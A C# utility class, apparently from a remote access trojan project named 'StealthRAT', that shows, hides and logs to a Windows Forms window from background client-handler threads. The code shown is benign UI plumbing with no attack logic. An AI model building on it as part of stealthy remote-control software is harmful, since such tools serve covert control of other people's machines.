using System;
using System.Threading;
using System.Windows.Forms;

namespace StealthRAT.Utilities
{
    /// <summary>
    /// Utility class that coordinates showing and hiding the local log window
    /// from various background client handler threads in a thread-safe manner.
    /// </summary>
    public static class UIManager
    {
        private static RemoteUIManager? _uiForm;
        private static readonly object _lock = new object();

        /// <summary>
        /// Registers the active logger with the UI callback to show logs inside the form RichTextBox.
        /// </summary>
        public static void Initialize(Action<string> logAction)
        {
            Services.FileLoggerService.RegisterUICallback(logAction);
        }

        /// <summary>
        /// Shows the UI on a dedicated STA thread.
        /// </summary>
        public static string ShowUI()
        {
            try
            {
                lock (_lock)
                {
                    if (_uiForm == null || _uiForm.IsDisposed)
                    {
                        var t = new Thread(() =>
                        {
                            _uiForm = new RemoteUIManager();
                            Application.Run(_uiForm);
                        });
                        t.SetApartmentState(ApartmentState.STA);
                        t.IsBackground = true;
                        t.Start();
                    }
                    else
                    {
                        _uiForm.Invoke(new Action(() => _uiForm.Show()));
                    }
                }
                return "OK: UI window shown.";
            }
            catch (Exception ex)
            {
                return $"ERR: Failed to show UI - {ex.Message}";
            }
        }

        /// <summary>
        /// Hides the UI window if it is visible.
        /// </summary>
        public static string HideUI()
        {
            try
            {
                lock (_lock)
                {
                    if (_uiForm != null && !_uiForm.IsDisposed)
                    {
                        _uiForm.Invoke(new Action(() => _uiForm.Hide()));
                    }
                }
                return "OK: UI window hidden.";
            }
            catch (Exception ex)
            {
                return $"ERR: Failed to hide UI - {ex.Message}";
            }
        }

        /// <summary>
        /// Appends a log entry to the UI.
        /// </summary>
        public static void LogToUI(string msg)
        {
            try
            {
                if (_uiForm != null && !_uiForm.IsDisposed)
                {
                    _uiForm.Log(msg);
                }
            }
            catch { }
        }
    }
}
